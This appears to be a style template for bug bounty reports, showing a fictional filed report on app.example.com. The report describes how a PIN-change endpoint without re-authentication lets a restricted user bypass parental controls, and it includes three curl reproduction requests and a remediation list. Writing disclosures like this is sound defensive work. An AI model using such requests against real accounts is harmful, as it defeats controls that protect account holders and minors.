# Example report

A filed-style report on a fictional target, showing the voice, length and structure. Match how steps open, how code blocks are introduced and how short the bullets are.

**Title:** Improper Access Control on app.example.com through /api/v2/account/pin via PUT parameter "pin" leads to parental control bypass

## Summary

The 6-digit PIN that guards restricted playback on `app.example.com` can be replaced by anyone holding an ordinary signed-in session. `PUT /api/v2/account/pin` requires neither the current PIN nor the account password, so the person the control restricts can remove it in one request.

## Steps to reproduce

1. Sign in as an ordinary account that already has a PIN set, with the parental guard enabled on the profile:

{YWH-....}

2. Confirm the content is blocked without the PIN:

Request:

```bash
curl -s "https://app.example.com/api/items/80985/videos" \
  -H "Authorization: Bearer $TOKEN"
```

Response:

```json
{"code":8012,"message":"This item is not available because of rating restriction."}
```

Screenshot:

{YWH-....}

3. Send this request to change the PIN, note that it doesn't need a re-authentication:

Request:

```bash
curl -s -X PUT "https://app.example.com/api/v2/account/pin" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pin":"662200"}'
```

Response:

```bash
204 No Content
```

Screenshot:

{YWH-....}

4. Confirm the new PIN unlocks the content:

Request:

```bash
curl -s -X POST "https://app.example.com/api/authorization/playback" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"pin":"662200"}'
```

Response:

```bash
200 OK with a Playback token
```

Screenshot:

{YWH-....}

## Impact

- A restricted user can reset the PIN and watch any rating-locked title.
- The account holder is never notified, so the control fails silently.

## Remediation

- Require the current PIN or the account password on `PUT /api/v2/account/pin`.
- Notify the account holder by email when the PIN changes.
